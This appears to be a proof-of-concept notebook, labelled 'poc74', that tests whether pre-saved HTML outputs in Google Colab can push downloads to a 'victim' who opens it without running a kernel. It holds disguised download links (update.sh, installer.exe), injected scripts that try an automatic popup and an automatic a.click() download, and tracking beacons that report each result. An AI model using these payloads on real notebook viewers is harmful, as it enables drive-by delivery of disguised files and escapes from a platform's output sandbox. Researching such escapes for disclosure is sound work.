# %% [markdown]
# # poc74 download sandbox test
#
# Open as VICTIM (no kernel). Click each link. Note which download.
#
# T1=txt T2=sh T3=exe T4=ipynb T5=auto popup T6=auto a.click

# %%
from IPython.display import HTML; HTML("")  # pre-saved
# Out:
# <p><a href="data:text/plain,T1_CONFIRMED" download="results.txt">Download Results (TXT)</a></p><img src="https://colab.research.google.com/__poc74/T1" width="1">

# %%
from IPython.display import HTML; HTML("")  # pre-saved
# Out:
# <p><a href="..." download="update.sh">Download Setup (.sh)</a></p><img src="https://colab.research.google.com/__poc74/T2" width="1">

# %%
from IPython.display import HTML; HTML("")  # pre-saved
# Out:
# <p><a href="..." download="installer.exe">Download Installer (.exe)</a></p><img src="https://colab.research.google.com/__poc74/T3" width="1">

# %%
from IPython.display import HTML; HTML("")  # pre-saved
# Out:
# <p><a href="data:application/octet-stream;base64,..." download="template.ipynb">Download Notebook Template</a></p><img src="https://colab.research.google.com/__poc74/T4" width="1">

# %%
from IPython.display import HTML; HTML("")  # pre-saved
# Out:
# <script>(function(){try{var b=new Blob(["T5"],{type:"application/octet-stream"});var u=URL.createObjectURL(b);var w=window.open(u,"_blank");new Image().src="https://colab.research.google.com/__poc74/T5_"+(w?"OPENED":"BLOCKED");}catch(e){new Image().src="https://colab.research.google.com/__poc74/T5_ERR";}})()</script><p><img src="https://colab.research.google.com/__poc74/T5_RENDERED" width="1"> T5: auto popup escape</p>

# %%
from IPython.display import HTML; HTML("")  # pre-saved
# Out:
# <script>(function(){try{var a=document.createElement("a");a.href="data:text/plain,T6";a.download="auto.txt";document.body.appendChild(a);a.click();document.body.removeChild(a);new Image().src="https://colab.research.google.com/__poc74/T6_CLICK_DONE";}catch(e){new Image().src="https://colab.research.google.com/__poc74/T6_ERR";}})()</script><p><img src="https://colab.research.google.com/__poc74/T6_RENDERED" width="1"> T6: auto a.click()</p>
